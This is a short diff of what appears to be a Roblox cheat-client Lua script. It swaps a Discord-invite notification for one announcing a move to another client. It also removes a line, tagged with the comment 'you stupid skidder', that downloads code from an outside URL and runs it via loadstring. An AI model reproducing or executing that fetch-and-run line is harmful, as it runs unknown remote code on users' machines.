@@ -16,11 +16,9 @@ bindable.OnInvoke = function()
 	setclipboard(DISCORD_LINK)
 end
 StarterGui:SetCore("SendNotification", {
-	Title = "Tys Client",
-	Text = "pls join discord broo",
+	Title = "bye bye..",
+	Text = "we are moving to Virtal Client, pls join discord for more info",
 	Duration = 10000000,
 	Button1 = "Join Discord",
 	Callback = bindable
 })
--- you stupid skidder
-loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=889xt4jr"))()
